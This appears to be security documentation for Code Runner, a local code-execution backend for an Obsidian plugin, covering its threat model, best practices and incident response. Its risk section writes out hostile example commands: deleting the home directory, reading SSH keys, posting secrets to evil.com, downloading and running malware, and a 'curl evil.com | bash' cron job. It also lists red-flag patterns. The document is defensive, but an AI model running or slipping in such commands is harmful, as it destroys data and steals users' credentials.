# Security Documentation - Code Runner

## Overview

Code Runner executes arbitrary code on your local machine. This document outlines security considerations, risks, and best practices.

---

## 🔒 Security Model

### What Code Runner Does

1. **Accepts code** from Obsidian plugin
2. **Executes code** using Python `exec()` or Node.js
3. **Returns output** to plugin
4. **Runs with YOUR user permissions**

### What This Means

**✅ Good:**
- Code runs locally (not on cloud)
- Backend only accessible from your machine
- No data sent to third parties (except LLM APIs if you use them)
- You control what code runs

**⚠️ Risks:**
- Code has full file system access
- Code can make network requests
- Code can install/modify software
- Code can access your credentials

---

## 🎯 Threat Model

### What We Protect Against

✅ **Network attacks:**
- Backend binds to `127.0.0.1` only
- Not accessible from network
- No remote code execution from outside

### What We DON'T Protect Against

❌ **Malicious code you run:**
```python
# You paste this and run it:
import os
os.system("rm -rf ~")  # Deletes your home directory
```

❌ **Compromised notes:**
If someone gains access to your vault and modifies code blocks, you might accidentally run malicious code.

❌ **Supply chain attacks:**
If a Python package you import is compromised, that code runs with your permissions.

---

## ⚠️ Security Risks

### Critical Risks

1. **File System Access**
```python
# Can delete files
os.remove("important.txt")

# Can read secrets
open("~/.ssh/id_rsa").read()

# Can modify files
open("resume.pdf", "w").write("HACKED")
```

2. **Network Access**
```python
# Can exfiltrate data
import requests
requests.post("evil.com", data={"secrets": "..."})
```

3. **Code Execution**
```python
# Can install malware
import subprocess
subprocess.run(["curl", "evil.com/malware", "-o", "/tmp/mal"])
subprocess.run(["/tmp/mal"])
```

4. **Persistence**
```python
# Can add to startup
cron_cmd = "* * * * * curl evil.com | bash"
os.system(f"echo '{cron_cmd}' | crontab -")
```

---

## ✅ Best Practices

### For Users

1. **Review Before Running**
   - Read every line of code
   - Understand what it does
   - Google unfamiliar functions

2. **Trust Sources**
   - Only run your own code
   - Verify code from tutorials
   - Be skeptical of copy-paste solutions

3. **Use Virtual Environments**
```bash
# Isolate Python packages
python -m venv code-runner-env
source code-runner-env/bin/activate
pip install -r requirements.txt
```

4. **Keep Backend Local**
   - Always use `127.0.0.1`
   - Never use `0.0.0.0`
   - Never port-forward

5. **Monitor Backend**
   - Check what ports are open: `netstat -an | grep 8000`
   - Verify localhost only: `lsof -i :8000`

### For Developers (If You Fork)

1. **Input Validation**
   - Sanitize code before execution (hard!)
   - Detect dangerous patterns
   - Warn on risky operations

2. **Sandboxing (Future)**
   - Use Docker containers
   - Restrict file system access
   - Disable network access
   - Use `seccomp` / `AppArmor`

3. **Least Privilege**
   - Run backend as low-privilege user
   - Don't run as root/admin
   - Use read-only file systems where possible

---

## 🚨 Red Flags (Don't Run This Code)

**Immediate danger signs:**

```python
# File deletion
os.system("rm -rf")
os.remove()
shutil.rmtree()

# Network exfiltration
requests.post("unknown-domain.com")
urllib.request.urlopen()

# Code execution
os.system()
subprocess.run()
eval()
exec()  # Ironic, but nested exec is even worse

# Stealth/obfuscation
__import__("base64").b64decode()
compile()
chr() + chr()  # Building strings from char codes
```

**If you see these, STOP and investigate.**

---

## 🔐 Comparison to Other Tools

| Tool | Trust Model | Risk Level |
|------|-------------|------------|
| **Terminal** | You type commands | High |
| **Jupyter** | You write code | High |
| **VS Code** | You write code | High |
| **Code Runner** | You write code | **High** |
| **Online Sandbox** | Code runs remotely | Low |

**Code Runner has the SAME risk as running code in your terminal.**

---

## 🛡️ Future Security Improvements

### v1.1 (Next Release)
- [ ] Dangerous pattern detection
- [ ] Warning prompts for risky operations
- [ ] File system access logging

### v2.0
- [ ] Docker container execution
- [ ] Configurable file system restrictions
- [ ] Network isolation mode
- [ ] Read-only execution environment

### v3.0
- [ ] Full sandboxing (WebAssembly?)
- [ ] Capability-based security
- [ ] Formal verification of sandboxing

---

## 📋 Security Checklist

**Before first use:**
- [ ] Understand execution risks
- [ ] Review security warnings
- [ ] Set up virtual environment
- [ ] Verify backend uses `127.0.0.1`

**Before running code:**
- [ ] Read entire code block
- [ ] Understand what it does
- [ ] Check for red flags
- [ ] Trust the source

**Ongoing:**
- [ ] Keep Python/packages updated
- [ ] Monitor backend activity
- [ ] Review vault access logs
- [ ] Backup important files

---

## ❓ FAQ

**Q: Is Code Runner safe?**
A: As safe as Jupyter or your terminal. You're responsible for code you run.

**Q: Can someone hack me through Code Runner?**
A: Not remotely (if backend is on `127.0.0.1`). But you can hack yourself by running malicious code.

**Q: Should I use this in production?**
A: For personal use, yes. For untrusted code, NO.

**Q: Can I run code from the internet?**
A: Technically yes. Should you? NO. Review it first.

**Q: What about LLM-generated code?**
A: **Review it!** AI can generate dangerous code accidentally.

---

## 🆘 If You've Run Malicious Code

1. **Immediately:**
   - Kill backend: `Ctrl+C` in terminal
   - Disconnect from internet
   - Close Obsidian

2. **Assess damage:**
   - Check file modifications: `ls -lt ~`
   - Check processes: `ps aux | grep python`
   - Check network: `netstat -an`
   - Check crontab: `crontab -l`

3. **Clean up:**
   - Remove suspicious files
   - Kill suspicious processes
   - Reset passwords if exposed
   - Scan for malware

4. **Report:**
   - Open GitHub issue (don't include code)
   - Help us improve security

---

## 📞 Contact

**Security issues:** Open a GitHub issue tagged `security`

**Questions:** See main README

---

**Remember: With great power comes great responsibility.** 🕷️

Use Code Runner wisely!
